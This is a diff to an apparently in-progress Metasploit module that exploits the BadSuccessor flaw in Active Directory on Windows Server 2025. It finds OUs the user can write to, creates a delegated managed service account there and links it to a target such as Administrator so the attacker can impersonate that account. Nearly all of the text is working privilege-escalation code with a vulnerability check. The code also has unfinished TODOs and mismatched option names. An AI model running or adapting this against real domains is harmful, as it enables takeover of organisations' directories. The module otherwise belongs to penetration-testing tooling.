@@ -11,6 +11,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::LDAP
   include Rex::Proto::LDAP
   include Msf::OptionalSession::LDAP
+  include Msf::Exploit::Remote::LDAP::ActiveDirectory
   #include Msf::Exploit::Remote::CheckModule
 
   # LDAP_SERVER_SD_FLAGS constant definition, taken from https://ldapwiki.com/wiki/LDAP_SERVER_SD_FLAGS_OID
@@ -38,6 +39,7 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'References' => [
           [ 'URL', 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory?&vid=badsuccessor-demo-video'],
+          [ 'URL', 'https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/'],
         ],
         'License' => MSF_LICENSE,
         'Platform' => 'win',
@@ -59,39 +61,75 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     )
+    register_options([
+                       OptString.new('DMSA_ACCOUNT_NAME', [true, 'The name of the dMSA account to be created']),
+                       OptString.new('ACCOUNT_TO_IMPERSONATE', [true, 'The name of the dMSA account to be created', 'Administrator']),
+                       OptString.new('DC_FQDM', [true, 'The fqdn of the domain controller, to be used in determining if the DC is vulnerable']),
+                     ])
   end
 
   #TODO check method?
+  def windows_version_vulnerable?
+    #TODO - should we just resolve the domain name of the RHOST value
+    fqdn = datastore['DC_FQDM']
+    filter = "(&(objectClass=computer)(dNSHostName=#{fqdn}))"
+    attributes = ['operatingSystem', 'operatingSystemVersion']
+    version_info =  @ldap.search(base: "OU=Domain Controllers," + @base_dn, filter: filter, attributes: attributes)
 
+    raise Net::LDAP::Error "Unable to retrieve Windows version information for #{fqdn}" if version_info.blank?
 
-  # This will return a list of SIDs that can edit the template from which the ACL is derived.
-  # The method checks the CreateChild, GenericAll, WriteDacl and WriteOwner bits of the access_mask to see if the user
-  # or group has write permissions over the OU
-  def get_sids_for_write(dacl)
-    allowed_sids = []
+    #TODO - need to be sure we're only going to be receiving one result here
+    version_info = version_info.first
+    os = version_info[:operatingsystem].first
+    os_version = version_info[:operatingsystemversion].first
 
-    dacl[:aces].each do |ace|
-      access_mask = ace[:body][:access_mask]
+    os_version =~ /\((\d+)\)/
+    build_number = Regexp.last_match(1)
 
-      # CreateChild comes from protocol field
-      mask = access_mask[:protocol]
-      has_create_child = (mask & 0x1) != 0
-
-      # Other rights come from explicit bits
-      has_generic_all = access_mask[:ga] == 1
-      has_write_dacl  = access_mask[:wd] == 1
-      has_write_owner = access_mask[:wo] == 1
-
-      if has_create_child || has_generic_all || has_write_dacl || has_write_owner
-        allowed_sids << ace[:body][:sid]
-      end
+    unless build_number.to_i >= 26100 && os.include?('Windows Server 2025')
+      print_error("#{fqdn}: #{os} #{os_version}. This module only works against Windows Server 2025, build 26100 and later (currently unpatched).")
+      return false
     end
-
-    allowed_sids
+    print_good("#{fqdn} is running a vulnerable version of Windows: #{os} #{os_version}")
+    true
   end
 
-  def get_ous_we_can_write_to(user_sid)
-    required_rights = %w[CreateChild GenericAll WriteDacl WriteOwner]
+  def check
+    ldap_connect do |ldap|
+      validate_bind_success!(ldap)
+
+      if (@base_dn = datastore['BASE_DN'])
+        print_status("User-specified base DN: #{@base_dn}")
+      else
+        print_status('Discovering base DN automatically')
+
+        unless (@base_dn = ldap.base_dn)
+          print_warning("Couldn't discover base DN!")
+        end
+      end
+      @ldap = ldap
+
+      begin
+        return Exploit::CheckCode::Safe unless windows_version_vulnerable?
+      rescue Net::LDAP::Error => e
+        return Exploit::CheckCode::Unknown(e.message)
+      end
+
+      ous = get_ous_we_can_write_to
+      if ous.blank?
+        return Exploit::CheckCode::Safe("Failed to find any Organizational Units #{datastore['LDAPUsername']} can write to.")
+      end
+
+      print_good("Found #{ous.length} OUs we can write to, listing below:")
+      ous.each do |ou|
+        print_good(" - #{ou}")
+      end
+
+      Exploit::CheckCode::Vulnerable
+    end
+  end
+
+  def get_ous_we_can_write_to
     organizational_units = []
 
     filter = '(objectClass=organizationalUnit)'
@@ -99,26 +137,10 @@ class MetasploitModule < Msf::Auxiliary
     entries = query_ldap_server(filter, attributes)
     entries.each do |entry|
 
-      security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(entry['nTSecurityDescriptor']&.first)
-      next unless security_descriptor
-
-      if security_descriptor.dacl
-        write_sids = get_sids_for_write(security_descriptor.dacl)
+      if adds_obj_grants_permissions?(@ldap, entry, SecurityDescriptorMatcher::Allow.any(%i[WP]))
+        organizational_units << entry[:dn].first
       end
-
-      next if write_sids.nil? || write_sids.empty?
-
-      # If the user SID is not in the list of SIDs with write permissions, skip this OU
-      if write_sids.include?(user_sid)
-        print_status("Found OU with write permissions for user SID #{user_sid}: #{entry.dn}")
-        organizational_units << entry.dn
-      else
-        print_status("Skipping OU #{entry.dn} as it does not have write permissions for user SID #{user_sid}")
-        next
-      end
-
     end
-
     organizational_units
   end
 
@@ -149,19 +171,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def create_dmsa(account_name, writeable_dn)
+    sam_account_name = account_name + '$' unless account_name.ends_with?('$')
     dn  = "CN=#{account_name},#{writeable_dn}"
-    print_status("Attempting to dmsa account cn: #{account_name}, dn: #{dn}")
+    print_status("Attempting to create dmsa account cn: #{account_name}, dn: #{dn}")
+
     dmsa_attributes = {
       'objectclass' => ["top", "person", "organizationalPerson", "user", "computer", "msDS-DelegatedManagedServiceAccount"],
       'cn' => [account_name],
       'useraccountcontrol' => ["4096"],
-      'samaccountname' => [account_name + '$'],
+      'samaccountname' => [sam_account_name],
       'dnshostname' => ["dontcare.com"],
       'msds-supportedencryptiontypes' => ["28"],
-      'msds-managedpasswordid' => ["\x01\x00\x00\x00KDSK\x02\x00\x00\x00k\x01\x00\x00\v\x00\x00\x00\a\x00\x00\x00\xC7\x14\x863y\xD1WQ\x8C\x9A4\xCC\xD6;\xF8x\x00\x00\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00m\x00s\x00f\x00.\x00l\x00o\x00c\x00a\x00l\x00\x00\x00m\x00s\x00f\x00.\x00l\x00o\x00c\x00a\x00l\x00\x00\x00"],
       'msds-managedpasswordinterval' => ["30"],
       'msds-delegatedmsastate' => ["0"],
-      #  'msds-managedaccountprecededbylink'=> ["CN=Administrator,CN=Users,DC=msf,DC=local"],
       'name' => [account_name]
     }
 
@@ -205,6 +227,7 @@ class MetasploitModule < Msf::Auxiliary
                                       })
   end
 
+  #TODO finish this method
   def grant_write_all_properties(dmsa_dn, user_sid)
     print_status("Granting 'Write all properties' permission for dMSA object: #{dmsa_dn}")
 
@@ -267,12 +290,10 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Successfully updated attributes for dMSA object: #{dn}")
   end
 
-  def query_account(account_name)
-    base_dn = 'OU=BadBois,DC=msf,DC=local'
-
+  def query_account(account_name, writeable_dn)
     filter = Net::LDAP::Filter.eq("cn", account_name)
     entry = nil
-    @ldap.search(base: base_dn, filter: filter) do |e|
+    @ldap.search(base: writeable_dn, filter: filter) do |e|
       entry = e
     end
 
@@ -283,11 +304,7 @@ class MetasploitModule < Msf::Auxiliary
 
     attrs_to_copy = {}
     entry.each do |attr, values|
-
-      next if %w[distinguishedname dn objectguid objectsid whencreated whenchanged samaccounttype instancetype iscriticalsystemobject objectcategory
-             usnchanged usncreated name badpwdcount lastlogoff lastlogon localpolicyflags pwdlastset accountexpires
-             dscorepropagationdata logoncount badpasswordtime countrycode codepage primarygroupid].include?(attr.to_s)
-
+      next unless %w[msds-managedaccountprecededbylink msds-delegatedmsastate].include?(attr.to_s)
       attrs_to_copy[attr.to_s] = values.map(&:to_s)
     end
 
@@ -298,42 +315,6 @@ class MetasploitModule < Msf::Auxiliary
         print_status("#{key} => #{value.inspect}")
       end
     end
-
-  end
-
-  def create_computer_account(computer_account, writeable_dn)
-    dn  = "CN=#{computer_account},#{writeable_dn}"
-    print_status("Attempting to dmsa account cn: #{computer_account}, dn: #{dn}")
-    computer_attributes = {
-      'objectclass' => ["top", "person", "organizationalPerson", "user", "computer"],
-      'cn' => [computer_account],
-      'useraccountcontrol' => ["4096"],
-      'samaccountname' => [computer_account + '$'],
-      'dnshostname' => ["dontcare.com"],
-      'userPassword' =>["N0tpassword!"],
-      'name' => [computer_account]
-    }
-
-    unless @ldap.add(dn: dn, attributes: computer_attributes)
-
-      res = @ldap.get_operation_result
-
-      case res.code
-      when Net::LDAP::ResultCodeInsufficientAccessRights
-        print_error("Insufficient access to create dMSA seed")
-      when Net::LDAP::ResultCodeEntryAlreadyExists
-        print_error("Seed object #{account_name} already exists")
-      when Net::LDAP::ResultCodeConstraintViolation
-        print_error("Constraint violation: #{res.error_message}")
-      else
-        print_error("#{res.message}: #{res.error_message}")
-      end
-
-      return false
-    end
-
-    print_good("Created dmsa #{computer_account}")
-    true
   end
 
   def run
@@ -351,44 +332,27 @@ class MetasploitModule < Msf::Auxiliary
 
       @ldap = ldap
 
-      # Run LDAP whoami - get user SID / group info
-      whoami_response = ''
-      begin
-        whoami_response = ldap.ldapwhoami
-      rescue Net::LDAP::Error => e
-        print_warning("The module failed to run the ldapwhoami command, ESC4 detection can't continue. Error was: #{e.class}: #{e.message}.")
-        return
+      # Get vulnerable OUs
+      ous = get_ous_we_can_write_to
+      print_good("Found #{ous.length} OUs we can write to, listing them below:")
+      ous.each do |ou|
+        print_good(" - #{ou}")
       end
 
-      if whoami_response.empty?
-        print_error("Unable to retrieve the username using ldapwhoami, ESC4 detection can't continue")
-        return
-      end
+      writeable_dn = ous.first
+      fail_with(Failure::NoTarget, "There are no Organization Units we can write to, the exploit can not continue") if ous.empty?
+      print_good("Found #{ous.length} OUs we can write to")
+      create_dmsa(datastore['ACCOUNT_NAME'], writeable_dn)
 
-
-      sam_account_name = whoami_response.split('\\')[1]
+      sam_account_name = datastore['ACCOUNT_NAME'] + '$' unless datastore['ACCOUNT_NAME'].ends_with?('$')
       user_raw_filter = "(sAMAccountName=#{sam_account_name})"
       attributes = ['DN', 'objectSID', 'objectClass', 'primarygroupID']
       our_account = ldap.search(base: @base_dn, filter: user_raw_filter, attributes: attributes)&.first
-
-      # Get vulnerable OUs
-      ous = get_ous_we_can_write_to(Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first).value)
-      writeable_dn = ous.first
-
-      fail_with(Failure::NoTarget, "There are no Organization Units we can write to, the exploit can not continue") if ous.empty?
-      account_name =  Faker::Internet.username(separators: '')
-      #computer_account = Faker::Internet.username(separators: '')
-      #computer_account = "server1"
-       account_name =  "attackie_boi"
-      print_good("Found #{ous.length} OUs we can write to")
-      #create_computer_account(computer_account, writeable_dn)
-      #generate_
-      #create_dmsa(account_name, writeable_dn)
-      require'pry-byebug';binding.pry
-      query_account("attackie_boi")
-      # You already have Write All Properties :hmmm:
-      #grant_write_all_properties("CN=#{account_name},#{writeable_dn}", Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first))
-      set_dmsa_attributes("CN=#{account_name},#{writeable_dn}","2", "CN=Administrator,CN=Users,DC=msf,DC=local")
+      #TODO I already have FullControl over this dMSA - this might not always be the case
+      #TODO It's possible you'll only end up with Owner (and in turn WriteDacl) which will require the module to edit the Dacl so we can then set the dmsa attributes to complete the dMSA account migration to impersonate the higher privileged account
+      #grant_write_all_properties("CN=#{datastore['ACCOUNT_NAME']},#{writeable_dn}", Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first))
+      set_dmsa_attributes("CN=#{datastore['ACCOUNT_NAME']},#{writeable_dn}","2", "CN=#{datastore['ACCOUNT_TO_IMPERSONATE']},CN=Users,DC=msf,DC=local")
+      query_account(datastore['ACCOUNT_NAME'], writeable_dn)
     end
   end
 end
